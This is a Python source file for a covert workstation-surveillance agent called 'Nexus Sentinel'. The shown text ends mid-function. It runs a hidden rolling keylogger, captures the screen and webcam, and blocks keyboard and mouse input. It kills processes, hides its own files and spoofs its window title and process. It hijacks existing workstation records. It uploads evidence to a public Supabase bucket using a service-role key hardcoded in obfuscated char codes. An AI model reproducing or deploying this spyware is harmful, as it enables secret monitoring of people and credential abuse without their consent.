"""
NEXUS SENTINEL — Phase 6.3 (Merged Sovereign Build)
=======================================================
Fuses the Forensic Agent and the Physical Warden into a single unit.
"""

from __future__ import annotations # MUST BE FIRST

import io
import json
import asyncio
import websockets
import os
import platform
import random
import re
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import uuid
from collections import deque
from datetime import datetime, timezone, timedelta
from pathlib import Path
import queue
import unicodedata
import difflib
from difflib import SequenceMatcher

import psutil

try:
    from supabase import create_client, Client
    from pynput import keyboard, mouse
    import cv2
    from PIL import ImageGrab
except ImportError:
    sys.exit("Install dependencies: pip install supabase psutil pillow pynput opencv-python")

# =====================================================
# THE WARDEN (Physical Enforcement Layer)
# =====================================================
class SentinelStrike:
    """The enforcement layer: Hardware Suppression and Surgical Termination."""
    def __init__(self, timeout_sec: int = 300):
        self.system_frozen = False
        self.timeout = timeout_sec
        self._lock = threading.Lock()
        
        # Explicit pointers for the kernel hooks
        self._k_listener = None
        self._m_listener = None

    def scalpel(self, target_name: str) -> bool:
        """Surgically terminate a specific process."""
        if not target_name: return False
        target_name = target_name.lower().strip()
        try:
            killed = False
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower().strip() == target_name:
                    proc.terminate()
                    print(f"[strike] Scalpel strike successful: {target_name}")
                    killed = True
            return killed
        except Exception as e:
            print(f"[strike] Scalpel failure: {e}", file=sys.stderr)
        return False

    def _suppressor_logic(self):
        """Discards all I/O interrupts at the driver level with explicit unhooking."""
        def dummy_callback(*args, **kwargs):
            pass 

        # Explicitly instantiate without context managers
        self._k_listener = keyboard.Listener(on_press=dummy_callback, on_release=dummy_callback, suppress=True)
        self._m_listener = mouse.Listener(on_click=dummy_callback, on_scroll=dummy_callback, on_move=dummy_callback, suppress=True)
        
        # Inject the hooks into the Windows Kernel
        self._k_listener.start()
        self._m_listener.start()

        start_time = time.time()
        while self.system_frozen:
            if time.time() - start_time > self.timeout:
                print("[strike] Failsafe timeout reached. Forcing OS unhook.")
                self.system_frozen = False
            time.sleep(0.1)

        # THE CURE: Explicitly tear down the kernel hooks when the loop breaks
        if self._k_listener: 
            self._k_listener.stop()
            self._k_listener = None
        if self._m_listener: 
            self._m_listener.stop()
            self._m_listener = None

    def engage_freeze(self, duration: int = None):
        """Locks hardware inputs."""
        with self._lock:
            if not self.system_frozen:
                self.system_frozen = True
                threading.Thread(target=self._suppressor_logic, daemon=True).start()
                print("[strike] Hardware Suppression Engaged.")
                if duration:
                    threading.Timer(duration, self.disengage_freeze).start()

    def disengage_freeze(self):
        """Restores user control."""
        with self._lock:
            if self.system_frozen:
                self.system_frozen = False # Breaks the while loop, triggering the .stop() teardown
                print("[strike] Hardware Suppression Disengaged.")

# Initialize the Warden locally
WARDEN = SentinelStrike()
# ---------- Config ----------
_u_codes = [104, 116, 116, 112, 115, 58, 47, 47, 111, 122, 114, 117, 105, 107, 102, 110, 114, 109, 109, 118, 104, 118, 111, 122, 103, 110, 111, 111, 46, 115, 117, 112, 97, 98, 97, 115, 101, 46, 99, 111]
_k_codes =  [101, 121, 74, 104, 98, 71, 99, 105, 79, 105, 74, 73, 85, 122, 73, 49, 78, 105, 73, 115, 73, 110, 82, 53, 99, 67, 73, 54, 73, 107, 112, 88, 86, 67, 74, 57, 46, 101, 121, 74, 112, 99, 51, 77, 105, 79, 105, 74, 122, 100, 88, 66, 104, 89, 109, 70, 122, 90, 83, 73, 115, 73, 110, 74, 108, 90, 105, 73, 54, 73, 109, 57, 54, 99, 110, 86, 112, 97, 50, 90, 117, 99, 109, 49, 116, 100, 109, 104, 50, 98, 51, 112, 110, 98, 109, 57, 118, 73, 105, 119, 105, 99, 109, 57, 115, 90, 83, 73, 54, 73, 110, 78, 108, 99, 110, 90, 112, 89, 50, 86, 102, 99, 109, 57, 115, 90, 83, 73, 115, 73, 109, 108, 104, 100, 67, 73, 54, 77, 84, 99, 51, 79, 68, 81, 53, 78, 68, 99, 48, 77, 105, 119, 105, 90, 88, 104, 119, 73, 106, 111, 121, 77, 68, 107, 48, 77, 68, 99, 119, 78, 122, 81, 121, 102, 81, 46, 75, 68, 95, 106, 109, 118, 115, 75, 57, 114, 87, 117, 55, 98, 114, 112, 77, 73, 107, 112, 102, 54, 118, 102, 76, 112, 103, 107, 67, 66, 120, 115, 71, 70, 69, 114, 100, 120, 106, 67, 104, 95, 73]

SUPABASE_URL = "".join(chr(c) for c in _u_codes)
SUPABASE_KEY = "".join(chr(c) for c in _k_codes)

# ---------- Identity Forging (Alias Override) ----------
ALIAS_FILE = Path.home() / ".sentinel_alias"


def get_workstation_identity() -> str:
    """Resolve workstation display name.

    Precedence:
      1. Contents of ~/.sentinel_alias (stripped) if present and non-empty.
      2. Fallback: socket.gethostname().
    Runs BEFORE the Supabase client is initialized so registration uses the
    forged identity from the very first network call.
    """
    try:
        if ALIAS_FILE.exists():
            alias = ALIAS_FILE.read_text(encoding="utf-8").strip()
            if alias:
                return alias
    except Exception as e:
        print(f"[identity] alias read failed: {e}", file=sys.stderr)
    return socket.gethostname()


WORKSTATION_NAME = get_workstation_identity()


# ---------- Kernel Priority Injection ----------
def set_high_priority() -> None:
    """Elevate this process so it out-competes browsers/games for CPU.

    Windows -> HIGH_PRIORITY_CLASS.
    Unix    -> nice(-10) (requires privileges; silently ignored otherwise).
    """
    try:
        p = psutil.Process(os.getpid())
        if platform.system().lower().startswith("win"):
            p.nice(psutil.HIGH_PRIORITY_CLASS)
        else:
            p.nice(-10)
    except (psutil.AccessDenied, PermissionError):
        # Insufficient privileges — keep running at normal priority.
        pass
    except Exception as e:
        print(f"[priority] elevation failed: {e}", file=sys.stderr)


# Apply immediately on script execution.
set_high_priority()

HEARTBEAT_INTERVAL = 15
SCAN_INTERVAL = 3
ACTION_POLL = 4
KEYLOG_DURATION = 10
ALERT_DEBOUNCE_SEC = 30
AMBIENT_DEBOUNCE_SEC = 60
FOCUS_REFRESH_SEC = 10
EVIDENCE_BUCKET = "evidence"

# --- Phase 6: The Forensic Vault ---
VAULT_DB = Path.home() / ".sentinel_vault.db"
CACHE_DIR = Path.home() / ".sentinel_cache"
SYNC_INTERVAL = 30  # seconds

# --- Hardware Mutex ---
OPTICS_LOCK = threading.Lock()
VAULT_LOCK = threading.Lock()  # SQLite is single-writer; serialize writes

# --- Volatile Stealth Config ---
GHOST_ACTIVE = False
SPOOF_DATA = {
    "proc": "msedge.exe",
    "title": "Microsoft Learn: Python for Data Science - Edge",
}
BYPASS_KEY = "099hsj"

# --- Phantom Typist scripts ---
PHANTOM_SCRIPT = [
    "def calculate_loss(y_true, y_pred):\n    return sum((t - p) ** 2 for t, p in zip(y_true, y_pred)) / len(y_true)\n",
    "import numpy as np\nmatrix = np.zeros((10, 10))\nfor i in range(10):\n    matrix[i][i] = 1\n",
    "async def fetch_data(url):\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as response:\n            return await response.json()\n",
    "class DataProcessor:\n    def __init__(self, data):\n        self.data = data\n    def clean(self):\n        return [d.strip() for d in self.data if d]\n",
    "SELECT users.id, profiles.avatar_url FROM users JOIN profiles ON users.id = profiles.user_id WHERE users.active = true;\n",
]

IDENTITY_FILE = Path.home() / ".sentinel_id"
COMMAND_TTL_SEC = 60
TERMINATE_GRACE_SEC = 10

# ---------- Compliance Severity Hierarchy (God-Tier 2026 Build) ----------
LEXICON: dict[str, list[str]] = {
    # LEVEL 1: THE UNFORGIVABLE (Hardcore/Specific only)
    "critical": [
        r"\b(pornhub|xvideos|redtube|brazzers|hentai|rule34|xxx|nsfw|gelbooru)\b",
        r"\b(gore|snuff|behead|execution|murder|suicide|isis|terrorist|jihad)\b",
    ],

    # LEVEL 2: THE INSURGENCY (Generic categories - trigger log, not 30s lock)
    "high": [
        r"\b(adult|sex|dating|hookup|escort|nude|naked|erotic)\b",
        r"\b(psiphon|ultrasurf|shadowsocks|vpn|proxy|tor\.exe|bypass[- ]?firewall)\b",
    ],
    # LEVEL 3: THE WASTELAND (Consumer Gaming & Piracy)
    "warning": [
        r"\b(steam|roblox|minecraft|fortnite|valorant|genshin|pubg|bgmi|free fire|apex legends|league of legends|counter-strike|csgo|cs2|epic games|battle\.net|rocket league|aimbot|wallhack|cheat engine|bluestacks|nox player|ldplayer|gameloop|memu|msi app player|andyroid|genymotion|cod[- ]?mobile|warzone)\b",
        r"\b(crack|keygen|warez|pirate|magnet:|torrent|utorrent|qbittorrent|1337x|piratebay|fitgirl|dodi-repacks|skidrow|reloaded|codex|rarbg|tpb|limetorrents|yts|yify|igg[- ]?games)\b",
        r"\b(netflix|primevideo|prime video|hotstar|disney\+|hulu|twitch|youtube|spotify|soundcloud|fmovies|9anime|aniwave|crunchyroll|aniwatch|bilibili|soap2day|lookmovie|pika[- ]?show)\b"
    ],

    # LEVEL 4: THE NOISE (Social Media & Research)
    "info": [
        r"\b(tiktok|instagram|facebook|snapchat|pinterest|tumblr|9gag|reddit|twitter|x\.com|discord|whatsapp|telegram|messenger|line\.me|viber|wechat)\b",
        r"\b(wikipedia|quora|medium\.com|stack overflow|stackoverflow|buzzfeed|boredpanda|chess\.com|lichess|beebom|the verge|techcrunch|gizmodo|ign|gamespot|gsmarena)\b"
    ],
}


_COMPILED: list[tuple[re.Pattern[str], str]] = []
for sev, patterns in LEXICON.items():
    for pat in patterns:
        _COMPILED.append((re.compile(pat, re.IGNORECASE), sev))


# ---------- Deep Normalization Engine (Text Crusher) ----------
import unicodedata
import difflib
import queue
from difflib import SequenceMatcher

# Invisible / zero-width characters that bypass naive matchers.
_ZERO_WIDTH_CHARS = dict.fromkeys(
    map(ord, [
        "\u200b", "\u200c", "\u200d", "\u200e", "\u200f",
        "\u202a", "\u202b", "\u202c", "\u202d", "\u202e",
        "\u2060", "\u2061", "\u2062", "\u2063", "\u2064",
        "\ufeff", "\u00ad", "\u180e", "\u034f",
    ]),
    "",
)

# Multi-character leetspeak / homoglyph combos applied BEFORE single-char map.
_MULTI_LEET = [
    (r"\|\\\|", "n"),    # |\|  -> n
    (r"\|\|", "u"),       # ||   -> u
    (r"\|\)", "d"),       # |)   -> d
    (r"\(\)", "o"),       # ()   -> o
    (r"\[\]", "o"),       # []   -> o
    (r"\\/\\/", "w"),     # \/\/ -> w
    (r"\\/", "v"),        # \/   -> v
    (r"/\\", "a"),        # /\   -> a
    (r"vv", "w"),
    # NOTE: "rn -> m" intentionally omitted — it mangles real words like "porn".
    (r"ph", "f"),         # ph -> f (phorn -> forn... pairs with mapping)
    (r"\$\$", "ss"),
]

# Single character leet / homoglyph map.
_LEET_MAP = str.maketrans({
    "0": "o", "1": "i", "!": "i", "|": "i", "3": "e", "4": "a",
    "@": "a", "5": "s", "$": "s", "7": "t", "+": "t", "8": "b",
    "9": "g", "6": "g", "€": "e", "£": "l", "¥": "y",
})

# After flattening, kill anything that isn't a-z0-9 or whitespace, then
# crush dotted/spaced bypasses like "p.o.r.n" or "p o r n" into "porn".
_NON_ALNUM = re.compile(r"[^a-z0-9\s]+")
_MULTI_WS = re.compile(r"\s+")
# A run of single letters separated by single spaces -> glue together.
_SPACED_LETTERS = re.compile(r"\b(?:[a-z]\s){1,}[a-z]\b")


def normalize_haystack(text: str) -> str:
    """Aggressive text purifier defeating unicode / leet / spacing bypasses."""
    if not text:
        return ""
    # 1. Unicode flattening: NFKD strips accents, expands ligatures, kills
    #    homoglyphs like ö -> o + combining diaeresis (then dropped).
    text = unicodedata.normalize("NFKD", text)
    text = "".join(c for c in text if not unicodedata.combining(c))
    # 2. Zero-width / bidi / invisible erasure.
    text = text.translate(_ZERO_WIDTH_CHARS)
    # 3. Lowercase early so leet maps stay simple.
    text = text.lower()
    # 4. Multi-char leetspeak combos.
    for pat, repl in _MULTI_LEET:
        text = re.sub(pat, repl, text)
    # 5. Single-char leet substitutions.
    text = text.translate(_LEET_MAP)
    # 6. Strip every non-alphanumeric symbol, replace with a space so word
    #    boundaries survive: "p.o.r.n" -> "p o r n".
    text = _NON_ALNUM.sub(" ", text)
    # 7. Crush runs of single letters separated by spaces back into words:
    #    "p o r n hub" -> "porn hub".
    def _glue(m: re.Match) -> str:
        return m.group(0).replace(" ", "")
    text = _SPACED_LETTERS.sub(_glue, text)
    # 8. Collapse whitespace.
    text = _MULTI_WS.sub(" ", text).strip()
    return text


# ---------- Fuzzy Token Matching ----------
# Flatten lexicon into per-severity token sets (alphanumeric tokens only).
_LEXICON_META = {
    "com", "exe", "svc", "net", "org", "www", "http", "https",
    "chrome", "edge", "excel", "powerpnt", "winword", "explorer", 
    "browser", "google", "microsoft", "taskmgr", "searchapp", "code", "roblox", "minecraft"
}
_TOKEN_LEXICON: dict[str, set[str]] = {sev: set() for sev in LEXICON}
_TOKEN_EXTRACT = re.compile(r"[a-z0-9]{3,}")

for _sev, _patterns in LEXICON.items():
    for _pat in _patterns:
        clean = _pat.replace(r"\b(", "").replace(r")\b", "")
        for rule in clean.split("|"):
            rule = rule.strip().lower()
            # Keep compound phrases out of the fuzzy token engine
            if " " in rule or "[" in rule or "\\." in rule:
                continue
            toks = _TOKEN_EXTRACT.findall(rule)
            # Only pure single words go to the fuzzy engine
            if len(toks) == 1 and toks[0] not in _LEXICON_META:
                _TOKEN_LEXICON[_sev].add(toks[0])
                
FUZZY_THRESHOLD_CRITICAL = 0.85
FUZZY_THRESHOLD_OTHER = 0.90  # stricter for less severe buckets to limit FPs
_RANK = {"info": 0, "warning": 1, "medium": 2, "high": 3, "critical": 4}


def _fuzzy_token_match(token: str) -> tuple[str | None, str]:
    """Return (matched_lexicon_token, severity) using Levenshtein-style ratio."""
    best: tuple[str | None, str] = (None, "info")
    if len(token) < 4:
        return best
    for sev, vocab in _TOKEN_LEXICON.items():
        threshold = FUZZY_THRESHOLD_CRITICAL if sev == "critical" else FUZZY_THRESHOLD_OTHER
        # difflib.get_close_matches uses SequenceMatcher ratio (~Levenshtein-ish).
        candidates = difflib.get_close_matches(token, vocab, n=1, cutoff=threshold)
        if candidates:
            if _RANK[sev] > _RANK[best[1]]:
                best = (candidates[0], sev)
    return best

# --- Global Optics Buffer ---
_LATEST_BROWSER_DOM = ""
_LATEST_BROWSER_URL = ""  # Fixed: Missing declaration
_OPTICS_LOCK = threading.Lock()

# GOD-TIER Web Weights: Tubes, Explicit Terms, and Intent Confirmers
WEB_WEIGHTS = {
    "hardcore": [
        "pornhub", "xvideos", "xnxx", "redtube", "youporn", "xhamster", 
        "brazzers", "hentai", "rule34", "chaturbate", "onlyfans", "spankbang", 
        "fapello", "hqporner", "gelbooru", "beeg", "spankwire", "daftsex",
        "heavy-r", "motherless", "txxx", "upornia"
    ], # 20 points
    "explicit": [
        "porn", "sex", "adult", "nude", "naked", "erotic", "nsfw", 
        "pussy", "dick", "boobs", "milf", "fuck", "cum", "tits"
    ], # 15 points
    "media": [
        "video", "watch", "streaming", "full", "clips", "collection", 
        "leak", "uncensored", "gallery", "photos", "hd", "premium"
    ]  # 5 points
}

WEB_CRITICAL_THRESHOLD = 40 

# INSTANT STRIKE LIST: 100% Certainty words for typing
INSTANT_STRIKE_LIST = {"pornhub", "xnxx", "xvideos", "hentai", "brazzers", "porn", "redtube"}

# --- Rolling Retrospective Keylog Buffer ---
class KeylogBuffer:
    def __init__(self, maxlen: int = 1000):
        self.buffer = deque(maxlen=maxlen)
        self._lock = threading.Lock()

    def add(self, key_str: str):
        with self._lock:
            self.buffer.append(key_str)

    def get_snapshot(self) -> str:
        with self._lock:
            return "".join(self.buffer)

KEYLOG_HISTORY = KeylogBuffer()

def _background_keylogger():
    """Silently maintains a rolling memory of the last 1000 keystrokes."""
    def on_press(key):
        try:
            KEYLOG_HISTORY.add(key.char)
        except AttributeError:
            if key == keyboard.Key.space: KEYLOG_HISTORY.add(" ")
            elif key == keyboard.Key.enter: KEYLOG_HISTORY.add(" [ENTER] ")
            elif key == keyboard.Key.backspace: KEYLOG_HISTORY.add("[BS]")
            else: KEYLOG_HISTORY.add(f"[{key.name}]")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def classify_web_context(dom_text: str) -> tuple[bool, str]:
    """Analyzes raw web text using weighted word-boundary matching."""
    if not dom_text or len(dom_text) < 20: return False, ""
    score, hits, text_lower = 0, [], dom_text.lower()

    for category, words in WEB_WEIGHTS.items():
        weight = 20 if category == "hardcore" else 15 if category == "explicit" else 5
        for word in words:
            if re.search(rf"\b{re.escape(word)}\b", text_lower):
                score += weight
                hits.append(word)

    if score >= WEB_CRITICAL_THRESHOLD:
        return True, f"web_intent({score}pts):" + "+".join(hits[:4])
    return False, ""

async def _telemetry_handler(websocket):
    global _LATEST_BROWSER_DOM, _LATEST_BROWSER_URL
    try:
        async for message in websocket:
            try:
                data = json.loads(message)
                with _OPTICS_LOCK:
                    _LATEST_BROWSER_DOM = data.get("content", "")
                    _LATEST_BROWSER_URL = data.get("url", "")
            except Exception: pass
    except websockets.exceptions.ConnectionClosed: pass

def boot_optics_server():
    """Bulletproof asyncio loop bridge for threaded server start."""
    async def _runner():
        # This syntax is required for websockets 10.0+ in a sub-thread
        async with websockets.serve(_telemetry_handler, "127.0.0.1", 8765):
            await asyncio.Future()  # Run forever

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_runner())
    except Exception as e:
        print(f"[optics] Server crash: {e}", file=sys.stderr)


def classify(title: str, proc: str) -> tuple[str | None, str]:
    """Hybrid classifier: regex pass on BOTH, fuzzy token pass on TITLE ONLY."""
    title_str = title or ""
    proc_str = proc or ""
    
    full_haystack = f"{title_str} {proc_str}"
    full_norm = normalize_haystack(full_haystack)
    title_norm = normalize_haystack(title_str)
    
    best: tuple[str | None, str] = (None, "info")

    # Pass 1: Regex lexicon against BOTH raw and normalized text
    for pattern, sev in _COMPILED:
        m = pattern.search(full_haystack) or pattern.search(full_norm)
        if m and _RANK[sev] > _RANK[best[1]]:
            best = (m.group(0).lower(), sev)

    # Pass 2: Fuzzy matching on TITLE ONLY (Immunizes process names)
    for token in _TOKEN_EXTRACT.findall(title_norm):
        hit, sev = _fuzzy_token_match(token)
        if hit and _RANK[sev] > _RANK[best[1]]:
            best = (token, sev)

    # Pass 3: Substring-fuzzy scan over TITLE ONLY
    if _RANK["critical"] > _RANK[best[1]]:
        for vtok in _TOKEN_LEXICON["critical"]:
            n = len(vtok)
            if n < 4 or n > 16:
                continue
            if vtok in title_norm:
                best = (vtok, "critical")
                break
                
            window_lo, window_hi = max(4, n - 1), n + 2
            matched = False
            for w in range(window_lo, window_hi + 1):
                limit = len(title_norm) - w
                step = max(1, w // 3)
                for i in range(0, limit + 1, step):
                    chunk = title_norm[i:i + w]
                    if " " in chunk: continue
                    if SequenceMatcher(None, chunk, vtok).ratio() >= FUZZY_THRESHOLD_CRITICAL:
                        best = (chunk, "critical")
                        matched = True
                        break
                if matched: break
            if matched: break
            
    return best


# ---------- Asynchronous NSFW Heuristic Classifier ----------
# Lightweight TF-IDF-ish weighted bag-of-words. No ML frameworks.
# Each term carries an "explicit intent" weight in [0,1].
_NSFW_WEIGHTS: dict[str, float] = {
    "teen": 0.55, "teens": 0.55, "amateur": 0.65, "webcam": 0.75, "cam": 0.45,
    "milf": 0.95, "anal": 0.95, "boobs": 0.85, "tits": 0.9, "nude": 0.9,
    "naked": 0.85, "creampie": 0.98, "blowjob": 0.98, "hardcore": 0.8,
    "fetish": 0.8, "lingerie": 0.7, "stripper": 0.85, "escort": 0.8,
    "hookup": 0.7, "hot": 0.25, "girl": 0.2, "girls": 0.25, "babe": 0.55,
    "babes": 0.6, "uncensored": 0.85, "18": 0.35, "xx": 0.7,
    "live": 0.2, "chat": 0.25, "private": 0.35, "show": 0.2,
}
NSFW_PROB_THRESHOLD = 0.78  # combined probability triggering Critical alert
_NSFW_TOKEN = re.compile(r"[a-z0-9]{2,}")


def analyze_nsfw_semantics(haystack: str) -> tuple[float, list[str]]:
    """Return (probability, contributing_tokens). Pure-Python, no ML deps."""
    if not haystack:
        return 0.0, []
    norm = normalize_haystack(haystack)
    tokens = _NSFW_TOKEN.findall(norm)
    if not tokens:
        return 0.0, []
    hits: list[tuple[str, float]] = []
    seen: set[str] = set()
    for t in tokens:
        if t in seen:
            continue
        seen.add(t)
        w = _NSFW_WEIGHTS.get(t)
        if w:
            hits.append((t, w))
    if len(hits) < 2:
        # Single weak signal isn't enough — require co-occurrence (entropy).
        return 0.0, [h[0] for h in hits]
    # Noisy-OR combination: P = 1 - prod(1 - w_i). Saturates near 1.0 when
    # multiple explicit terms co-occur, but stays low for one weak word.
    prob = 1.0
    for _, w in hits:
        prob *= (1.0 - w)
    prob = 1.0 - prob
    return prob, [h[0] for h in hits]


# Async worker so the (cheap but non-trivial) semantic + fuzzy passes never
# block the 3-second scan_loop. Single-slot queue: only the latest haystack
# matters; older pending items get dropped.
_SEMANTIC_IN: "queue.Queue[tuple[str, str]]" = queue.Queue(maxsize=1)
_SEMANTIC_OUT: dict[str, tuple[float, list[str]]] = {}
_SEMANTIC_LOCK = threading.Lock()


def _semantic_worker() -> None:
    while True:
        try:
            key, hay = _SEMANTIC_IN.get()
        except Exception:
            continue
        try:
            score, toks = analyze_nsfw_semantics(hay)
            with _SEMANTIC_LOCK:
                _SEMANTIC_OUT[key] = (score, toks)
                # Bound dict size.
                if len(_SEMANTIC_OUT) > 32:
                    for k in list(_SEMANTIC_OUT.keys())[:-16]:
                        _SEMANTIC_OUT.pop(k, None)
        except Exception as e:
            print(f"[semantic] {e}", file=sys.stderr)


threading.Thread(target=_semantic_worker, daemon=True).start()


def submit_semantic_scan(haystack: str) -> None:
    """Non-blocking submit: drop old job if worker is still busy."""
    if not haystack:
        return
    try:
        if _SEMANTIC_IN.full():
            try:
                _SEMANTIC_IN.get_nowait()
            except queue.Empty:
                pass
        _SEMANTIC_IN.put_nowait((haystack, haystack))
    except queue.Full:
        pass


def consume_semantic_result(haystack: str) -> tuple[float, list[str]] | None:
    with _SEMANTIC_LOCK:
        return _SEMANTIC_OUT.pop(haystack, None)


# ---------- Init ----------
if not SUPABASE_URL or not SUPABASE_KEY:
    sys.exit("Missing SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY env vars.")

sb: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
START_TIME = time.time()


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def os_info() -> dict:
    return {
        "platform": platform.system(),
        "release": platform.release(),
        "host": socket.gethostname(),
    }


def _hide_path(p: Path) -> None:
    """Best-effort: hide a file/dir on Windows."""
    try:
        if platform.system() == "Windows":
            subprocess.call(["attrib", "+H", str(p)], shell=False)
    except Exception:
        pass


# =====================================================
# PHASE 6 — THE FORENSIC VAULT (SQLite + Image Cache)
# =====================================================
def vault_init() -> None:
    """Bootstrap the local SQLite buffer and the cache directory."""
    try:
        CACHE_DIR.mkdir(parents=True, exist_ok=True)
        _hide_path(CACHE_DIR)

        with sqlite3.connect(VAULT_DB) as conn:
            conn.execute("PRAGMA journal_mode=WAL;")
            conn.execute(
                """
                CREATE TABLE IF NOT EXISTS queue (
                    id          INTEGER PRIMARY KEY AUTOINCREMENT,
                    kind        TEXT NOT NULL,           -- 'alert' | 'activity'
                    table_name  TEXT NOT NULL,
                    payload     TEXT NOT NULL,           -- JSON of the row body
                    evidence    TEXT,                    -- JSON {screenshot, webcam, meta}
                    created_at  TEXT NOT NULL,           -- ORIGINAL ISO timestamp
                    attempts    INTEGER DEFAULT 0,
                    last_error  TEXT
                );
                """
            )
            conn.commit()
        _hide_path(VAULT_DB)
        print(f"[vault] forensic vault online → {VAULT_DB}")
    except Exception as e:
        print(f"[vault] init failed: {e}", file=sys.stderr)


def _save_cache_blob(blob: bytes, suffix: str = ".jpg") -> str | None:
    """Persist a JPEG byte-stream into the cache. Returns filename (not full path)."""
    if not blob:
        return None
    try:
        fname = f"{uuid.uuid4().hex}{suffix}"
        (CACHE_DIR / fname).write_bytes(blob)
        return fname
    except Exception as e:
        print(f"[vault] cache write failed: {e}", file=sys.stderr)
        return None


def _delete_cache(fname: str | None) -> None:
    if not fname:
        return
    try:
        (CACHE_DIR / fname).unlink(missing_ok=True)
    except Exception:
        pass


def vault_enqueue(
    kind: str,
    table_name: str,
    payload: dict,
    evidence: dict | None,
    created_at: str,
) -> None:
    """Serialize a payload into the local queue under VAULT_LOCK."""
    try:
        with VAULT_LOCK, sqlite3.connect(VAULT_DB) as conn:
            conn.execute(
                "INSERT INTO queue(kind, table_name, payload, evidence, created_at) "
                "VALUES (?,?,?,?,?)",
                (
                    kind,
                    table_name,
                    json.dumps(payload, default=str),
                    json.dumps(evidence or {}, default=str),
                    created_at,
                ),
            )
            conn.commit()
        print(f"[vault] queued {kind}/{table_name} (legacy=True) ts={created_at}")
    except Exception as e:
        print(f"[vault] enqueue failed: {e}", file=sys.stderr)


def vault_pending(limit: int = 25) -> list[tuple]:
    try:
        with VAULT_LOCK, sqlite3.connect(VAULT_DB) as conn:
            cur = conn.execute(
                "SELECT id, kind, table_name, payload, evidence, created_at, attempts "
                "FROM queue ORDER BY id ASC LIMIT ?",
                (limit,),
            )
            return cur.fetchall()
    except Exception as e:
        print(f"[vault] read failed: {e}", file=sys.stderr)
        return []


def vault_delete(row_id: int) -> None:
    try:
        with VAULT_LOCK, sqlite3.connect(VAULT_DB) as conn:
            conn.execute("DELETE FROM queue WHERE id=?", (row_id,))
            conn.commit()
    except Exception as e:
        print(f"[vault] delete failed: {e}", file=sys.stderr)


def vault_bump_attempt(row_id: int, err: str) -> None:
    try:
        with VAULT_LOCK, sqlite3.connect(VAULT_DB) as conn:
            conn.execute(
                "UPDATE queue SET attempts = attempts + 1, last_error = ? WHERE id = ?",
                (err[:500], row_id),
            )
            conn.commit()
    except Exception:
        pass


# ---------- Bucket bootstrap & identity ----------
def ensure_bucket() -> None:
    try:
        sb.storage.create_bucket(
            EVIDENCE_BUCKET,
            options={"public": True, "file_size_limit": 10 * 1024 * 1024},
        )
        print(f"[storage] created bucket '{EVIDENCE_BUCKET}'")
    except Exception as e:
        msg = str(e).lower()
        if "already exists" in msg or "duplicate" in msg or "409" in msg:
            return
        print(f"[storage] bucket bootstrap warning: {e}", file=sys.stderr)


def load_or_create_hardware_uuid() -> str:
    try:
        if IDENTITY_FILE.exists():
            val = IDENTITY_FILE.read_text(encoding="utf-8").strip()
            if val:
                return val
    except Exception as e:
        print(f"[identity] read failed: {e}", file=sys.stderr)
    new_id = str(uuid.uuid4())
    try:
        IDENTITY_FILE.write_text(new_id, encoding="utf-8")
        _hide_path(IDENTITY_FILE)
        print(f"[identity] minted hardware uuid → {IDENTITY_FILE}")
    except Exception as e:
        print(f"[identity] write failed (using ephemeral id): {e}", file=sys.stderr)
    return new_id


HARDWARE_UUID = load_or_create_hardware_uuid()


def register_workstation() -> str:
    """
    Sovereign Upsert: Hijacks existing names or creates fresh targets.
    One-shot synchronization to ensure metadata is never null.
    """
    # 1. Try to find the ID by UUID or Name
    res = sb.table("workstations").select("id").eq("hardware_uuid", HARDWARE_UUID).execute()
    wid = res.data[0]["id"] if res.data else None

    if not wid:
        # 2. Check for name collision (The Hijack)
        res_name = sb.table("workstations").select("id").eq("name", WORKSTATION_NAME).execute()
        if res_name.data:
            wid = res_name.data[0]["id"]
            print(f"[identity] Hijacking existing record for {WORKSTATION_NAME}")

    # 3. The Payload (Unified for both New and Existing records)
    payload = {
        "name": WORKSTATION_NAME,
        "hardware_uuid": HARDWARE_UUID,
        "status": "online",
        "last_heartbeat": now_iso(),
        "os_info": os_info(),
    }

    if wid:
        # Update existing
        sb.table("workstations").update(payload).eq("id", wid).execute()
    else:
        # Create fresh
        res_new = sb.table("workstations").insert(payload).execute()
        wid = res_new.data[0]["id"]

    return wid


# ---------- Foreground window ----------
def get_foreground_window() -> tuple[str | None, str | None]:
    system = platform.system()
    try:
        if system == "Windows":
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buf, length + 1)
            title = buf.value
            pid = wintypes.DWORD()
            user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            try:
                proc = psutil.Process(pid.value).name()
            except Exception:
                proc = None
            return title, proc
        if system == "Darwin":
            script = 'tell application "System Events" to get name of first process whose frontmost is true'
            proc = subprocess.check_output(["osascript", "-e", script]).decode().strip()
            return proc, proc
        try:
            wid = subprocess.check_output(["xdotool", "getactivewindow"]).decode().strip()
            title = subprocess.check_output(["xdotool", "getwindowname", wid]).decode().strip()
            pid = subprocess.check_output(["xdotool", "getwindowpid", wid]).decode().strip()
            proc = psutil.Process(int(pid)).name()
            return title, proc
        except Exception:
            return None, None
    except Exception as e:
        print(f"[scan] foreground error: {e}", file=sys.stderr)
        return None, None


# ---------- Evidence capture ----------
def capture_screenshot() -> bytes | None:
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=75, optimize=True)
        return buf.getvalue()
    except Exception as e:
        print(f"[evidence] screenshot failed: {e}", file=sys.stderr)
        return None


def capture_webcam() -> bytes | None:
    with OPTICS_LOCK:
        try:
            import cv2
            # 1. Attempt connection. DSHOW is fast, but we fallback to default if it fails.
            if platform.system() == "Windows":
                cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                if not cam.isOpened():
                    cam = cv2.VideoCapture(0) # Failsafe backend
            else:
                cam = cv2.VideoCapture(0)
            
            if not cam.isOpened():
                print("[evidence] Webcam locked by another app or disconnected.", file=sys.stderr)
                return None

            # 2. Sensor Warmup: Hardware requires time to adjust exposure/light
            time.sleep(0.5) 
            for _ in range(3):
